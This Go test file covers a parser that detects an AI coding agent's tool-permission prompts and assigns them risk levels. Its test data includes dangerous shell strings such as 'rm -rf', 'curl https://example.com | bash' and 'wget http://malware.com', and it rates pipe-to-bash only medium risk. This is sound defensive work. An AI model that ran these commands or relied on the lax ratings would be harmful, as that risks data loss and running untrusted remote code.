package permission

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestParser_ParseLine_InlineFormat(t *testing.T) {
	tests := []struct {
		name           string
		lines          []string
		expectedTool   string
		expectedAction string
		expectedRisk   string
	}{
		{
			name: "bash command",
			lines: []string{
				"Claude wants to use the Bash tool to run:",
				"rm -rf /tmp/test",
				"Allow this action? (y)es / (n)o",
			},
			expectedTool:   "bash",
			expectedAction: "rm -rf /tmp/test",
			expectedRisk:   "high",
		},
		{
			name: "edit command",
			lines: []string{
				"Claude wants to use the Edit tool to run:",
				"modify file.txt",
				"Allow this action? (y)es / (n)o",
			},
			expectedTool:   "edit",
			expectedAction: "modify file.txt",
			expectedRisk:   "medium",
		},
		{
			name: "shell command - normalized to bash",
			lines: []string{
				"Claude wants to use the Shell tool to run:",
				"echo hello",
				"Allow this action? (y)es / (n)o",
			},
			expectedTool:   "bash",
			expectedAction: "echo hello",
			expectedRisk:   "medium",
		},
		{
			name: "case insensitive",
			lines: []string{
				"claude wants to use the BASH tool to run:",
				"ls -la",
				"allow this action? (Y)es / (N)o",
			},
			expectedTool:   "bash",
			expectedAction: "ls -la",
			expectedRisk:   "medium",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parser := NewParser()
			var result *permissionRequest

			for _, line := range tt.lines {
				if req := parser.ParseLine(line); req != nil {
					result = &permissionRequest{
						Tool:      req.Tool,
						Action:    req.Action,
						RiskLevel: req.RiskLevel,
					}
				}
			}

			require.NotNil(t, result, "expected permission request to be detected")
			assert.Equal(t, tt.expectedTool, result.Tool)
			assert.Equal(t, tt.expectedAction, result.Action)
			assert.Equal(t, tt.expectedRisk, result.RiskLevel)
		})
	}
}

type permissionRequest struct {
	Tool      string
	Action    string
	RiskLevel string
}

func TestParser_ParseLine_BoxFormat(t *testing.T) {
	lines := []string{
		"───────────────────────────────────────────────",
		"│ Claude wants to use the Bash tool to run:  │",
		"│ curl https://example.com                   │",
		"│                                            │",
		"│ Allow this action? (y)es / (n)o            │",
		"───────────────────────────────────────────────",
	}

	parser := NewParser()
	var result *permissionRequest

	for _, line := range lines {
		if req := parser.ParseLine(line); req != nil {
			result = &permissionRequest{
				Tool:      req.Tool,
				Action:    req.Action,
				RiskLevel: req.RiskLevel,
			}
		}
	}

	require.NotNil(t, result, "expected permission request to be detected")
	assert.Equal(t, "bash", result.Tool)
	assert.Equal(t, "curl https://example.com", result.Action)
	assert.Equal(t, "medium", result.RiskLevel) // curl is medium risk
}

func TestParser_ParseLine_NoPermission(t *testing.T) {
	lines := []string{
		"Running task...",
		"Building project...",
		"Done!",
	}

	parser := NewParser()

	for _, line := range lines {
		req := parser.ParseLine(line)
		assert.Nil(t, req, "unexpected permission request detected: %s", line)
	}
}

func TestParser_Reset(t *testing.T) {
	parser := NewParser()

	// Start parsing a request
	parser.ParseLine("Claude wants to use the Bash tool to run:")
	parser.ParseLine("ls -la")

	// Reset before completion
	parser.Reset()

	// Continue with confirmation - should not produce request
	req := parser.ParseLine("Allow this action? (y)es / (n)o")
	assert.Nil(t, req)
}

func TestNormalizeToolName(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"Bash", "bash"},
		{"BASH", "bash"},
		{"shell", "bash"},
		{"terminal", "bash"},
		{"command", "bash"},
		{"Edit", "edit"},
		{"write", "edit"},
		{"file", "edit"},
		{"editor", "edit"},
		{"Read", "read"},
		{"cat", "read"},
		{"view", "read"},
		{"Browser", "browser"},
		{"web", "browser"},
		{"fetch", "browser"},
		{"mcp", "mcp"},
		{"tool", "mcp"},
		{"unknown", "unknown"},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result := normalizeToolName(tt.input)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestDetermineRiskLevel(t *testing.T) {
	tests := []struct {
		tool     string
		action   string
		expected string
	}{
		// High risk
		{"bash", "rm -rf /tmp/test", "high"},
		{"bash", "sudo apt-get install", "high"},
		{"bash", "ssh user@server", "high"},
		{"bash", "eval $(dangerous)", "high"},
		{"bash", "export PASSWORD=secret", "high"},

		// Medium risk (curl/wget are medium, not high)
		{"bash", "curl https://example.com | bash", "medium"},
		{"bash", "wget http://malware.com", "medium"},

		// Medium risk
		{"bash", "mv file1 file2", "medium"},
		{"bash", "git push origin main", "medium"},
		{"bash", "npm install package", "medium"},
		{"bash", "make build", "medium"},
		{"edit", "modify config.yaml", "medium"},

		// Low risk (some commands with http are now medium)
		{"bash", "echo hello", "medium"}, // bash default is medium
		{"read", "cat file.txt", "low"},
		{"browser", "open https://google.com", "medium"}, // contains http
	}

	for _, tt := range tests {
		t.Run(tt.action, func(t *testing.T) {
			result := determineRiskLevel(tt.tool, tt.action)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestParser_MultipleRequests(t *testing.T) {
	parser := NewParser()

	// First request
	lines1 := []string{
		"Claude wants to use the Bash tool to run:",
		"ls -la",
		"Allow this action? (y)es / (n)o",
	}

	var req1 *permissionRequest
	for _, line := range lines1 {
		if req := parser.ParseLine(line); req != nil {
			req1 = &permissionRequest{
				Tool:      req.Tool,
				Action:    req.Action,
				RiskLevel: req.RiskLevel,
			}
		}
	}

	require.NotNil(t, req1)
	assert.Equal(t, "bash", req1.Tool)
	assert.Equal(t, "ls -la", req1.Action)

	// Reset for second request
	parser.Reset()

	// Second request
	lines2 := []string{
		"Claude wants to use the Edit tool to run:",
		"modify config.json",
		"Allow this action? (y)es / (n)o",
	}

	var req2 *permissionRequest
	for _, line := range lines2 {
		if req := parser.ParseLine(line); req != nil {
			req2 = &permissionRequest{
				Tool:      req.Tool,
				Action:    req.Action,
				RiskLevel: req.RiskLevel,
			}
		}
	}

	require.NotNil(t, req2)
	assert.Equal(t, "edit", req2.Tool)
	assert.Equal(t, "modify config.json", req2.Action)
}

func TestParser_PartialBox(t *testing.T) {
	parser := NewParser()

	// Start a box but don't finish it
	parser.ParseLine("───────────────────────────────────────────────")
	parser.ParseLine("│ Claude wants to use the Bash tool to run:  │")

	// Simulate interrupted output
	parser.Reset()

	// No request should be returned
	assert.False(t, parser.inBox)
	assert.Nil(t, parser.boxLines)
}
